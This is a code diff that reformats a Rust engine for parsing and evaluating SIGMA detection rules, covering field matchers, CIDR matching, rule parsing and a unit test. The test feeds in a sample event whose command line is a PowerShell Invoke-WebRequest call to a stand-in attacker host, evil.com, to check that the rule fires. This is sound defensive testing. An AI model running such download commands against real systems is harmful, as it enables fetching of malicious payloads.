@@ -47,13 +47,19 @@ impl std::fmt::Display for SigmaError {
 
 impl std::error::Error for SigmaError {}
 impl From<serde_yaml::Error> for SigmaError {
-    fn from(e: serde_yaml::Error) -> Self { Self::Yaml(e) }
+    fn from(e: serde_yaml::Error) -> Self {
+        Self::Yaml(e)
+    }
 }
 impl From<std::io::Error> for SigmaError {
-    fn from(e: std::io::Error) -> Self { Self::Io(e) }
+    fn from(e: std::io::Error) -> Self {
+        Self::Io(e)
+    }
 }
 impl From<sigma_condition::ConditionParseError> for SigmaError {
-    fn from(e: sigma_condition::ConditionParseError) -> Self { Self::InvalidCondition(e) }
+    fn from(e: sigma_condition::ConditionParseError) -> Self {
+        Self::InvalidCondition(e)
+    }
 }
 
 // ── Public types ─────────────────────────────────────────────────────────────
@@ -217,7 +223,11 @@ pub fn load_sigma_rules_from_dir(path: &Path) -> Vec<SigmaRule> {
         }
     }
 
-    tracing::info!(count = rules.len(), "loaded SIGMA rules from {}", path.display());
+    tracing::info!(
+        count = rules.len(),
+        "loaded SIGMA rules from {}",
+        path.display()
+    );
     rules
 }
 
@@ -243,7 +253,10 @@ pub fn evaluate(rule: &SigmaRule, event: &EventFields) -> bool {
 
 fn evaluate_selection(group: &SelectionGroup, event: &EventFields, category: &str) -> bool {
     // All field matchers in a selection are AND-ed.
-    group.fields.iter().all(|fm| evaluate_field_matcher(fm, event, category))
+    group
+        .fields
+        .iter()
+        .all(|fm| evaluate_field_matcher(fm, event, category))
 }
 
 fn evaluate_field_matcher(fm: &FieldMatcher, event: &EventFields, category: &str) -> bool {
@@ -255,10 +268,14 @@ fn evaluate_field_matcher(fm: &FieldMatcher, event: &EventFields, category: &str
 
     if fm.match_all {
         // All values must match (AND).
-        fm.values.iter().all(|v| match_value(&event_value, v, &fm.modifier))
+        fm.values
+            .iter()
+            .all(|v| match_value(&event_value, v, &fm.modifier))
     } else {
         // At least one value must match (OR).
-        fm.values.iter().any(|v| match_value(&event_value, v, &fm.modifier))
+        fm.values
+            .iter()
+            .any(|v| match_value(&event_value, v, &fm.modifier))
     }
 }
 
@@ -269,11 +286,9 @@ fn match_value(event_value: &str, pattern: &str, modifier: &Modifier) -> bool {
         Modifier::Contains => event_value.contains(&pat),
         Modifier::StartsWith => event_value.starts_with(&pat),
         Modifier::EndsWith => event_value.ends_with(&pat),
-        Modifier::Regex => {
-            regex::Regex::new(pattern)
-                .map(|re| re.is_match(event_value))
-                .unwrap_or(false)
-        }
+        Modifier::Regex => regex::Regex::new(pattern)
+            .map(|re| re.is_match(event_value))
+            .unwrap_or(false),
         Modifier::Base64 => {
             use base64::Engine;
             let encoded = base64::engine::general_purpose::STANDARD.encode(pattern.as_bytes());
@@ -291,14 +306,24 @@ fn match_cidr(ip_str: &str, cidr: &str) -> bool {
     if parts.len() != 2 {
         return false;
     }
-    let Ok(net_ip) = parts[0].parse::<std::net::Ipv4Addr>() else { return false };
-    let Ok(prefix_len) = parts[1].parse::<u32>() else { return false };
-    let Ok(check_ip) = ip_str.parse::<std::net::Ipv4Addr>() else { return false };
+    let Ok(net_ip) = parts[0].parse::<std::net::Ipv4Addr>() else {
+        return false;
+    };
+    let Ok(prefix_len) = parts[1].parse::<u32>() else {
+        return false;
+    };
+    let Ok(check_ip) = ip_str.parse::<std::net::Ipv4Addr>() else {
+        return false;
+    };
 
     if prefix_len > 32 {
         return false;
     }
-    let mask = if prefix_len == 0 { 0u32 } else { !0u32 << (32 - prefix_len) };
+    let mask = if prefix_len == 0 {
+        0u32
+    } else {
+        !0u32 << (32 - prefix_len)
+    };
     (u32::from(net_ip) & mask) == (u32::from(check_ip) & mask)
 }
 
@@ -383,9 +408,14 @@ fn parse_level(s: &str) -> SigmaLevel {
 }
 
 fn parse_logsource(doc: &Value) -> Result<LogSource, SigmaError> {
-    let ls = doc.get("logsource").ok_or(SigmaError::MissingField("logsource"))?;
+    let ls = doc
+        .get("logsource")
+        .ok_or(SigmaError::MissingField("logsource"))?;
     Ok(LogSource {
-        category: ls.get("category").and_then(|v| v.as_str()).map(String::from),
+        category: ls
+            .get("category")
+            .and_then(|v| v.as_str())
+            .map(String::from),
         product: ls.get("product").and_then(|v| v.as_str()).map(String::from),
         service: ls.get("service").and_then(|v| v.as_str()).map(String::from),
     })
@@ -417,8 +447,12 @@ fn extract_attack_ids(tags: &[String]) -> Vec<String> {
 }
 
 fn parse_detection(doc: &Value) -> Result<Detection, SigmaError> {
-    let det = doc.get("detection").ok_or(SigmaError::MissingField("detection"))?;
-    let det_map = det.as_mapping().ok_or(SigmaError::MissingField("detection (mapping)"))?;
+    let det = doc
+        .get("detection")
+        .ok_or(SigmaError::MissingField("detection"))?;
+    let det_map = det
+        .as_mapping()
+        .ok_or(SigmaError::MissingField("detection (mapping)"))?;
 
     // Separate "condition" from selection entries.
     let condition_str = det
@@ -438,7 +472,10 @@ fn parse_detection(doc: &Value) -> Result<Detection, SigmaError> {
         selections.insert(name, group);
     }
 
-    Ok(Detection { selections, condition })
+    Ok(Detection {
+        selections,
+        condition,
+    })
 }
 
 fn parse_selection_group(value: &Value) -> Result<SelectionGroup, SigmaError> {
@@ -450,7 +487,12 @@ fn parse_selection_group(value: &Value) -> Result<SelectionGroup, SigmaError> {
                 let raw_key = k.as_str().unwrap_or("");
                 let (field, modifier, match_all) = parse_field_key(raw_key)?;
                 let values = value_to_strings(v);
-                fields.push(FieldMatcher { field, modifier, values, match_all });
+                fields.push(FieldMatcher {
+                    field,
+                    modifier,
+                    values,
+                    match_all,
+                });
             }
         }
         Value::Sequence(seq) => {
@@ -464,7 +506,12 @@ fn parse_selection_group(value: &Value) -> Result<SelectionGroup, SigmaError> {
                         let raw_key = k.as_str().unwrap_or("");
                         let (field, modifier, match_all) = parse_field_key(raw_key)?;
                         let values = value_to_strings(v);
-                        fields.push(FieldMatcher { field, modifier, values, match_all });
+                        fields.push(FieldMatcher {
+                            field,
+                            modifier,
+                            values,
+                            match_all,
+                        });
                     }
                 }
             }
@@ -559,8 +606,14 @@ tags:
     fn test_evaluate_match() {
         let rule = parse_sigma_rule(SAMPLE_RULE).unwrap();
         let mut event = EventFields::new();
-        event.insert("image_path".into(), r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into());
-        event.insert("cmdline".into(), "powershell -c Invoke-WebRequest http://evil.com".into());
+        event.insert(
+            "image_path".into(),
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
+        );
+        event.insert(
+            "cmdline".into(),
+            "powershell -c Invoke-WebRequest http://evil.com".into(),
+        );
         assert!(evaluate(&rule, &event));
     }
 
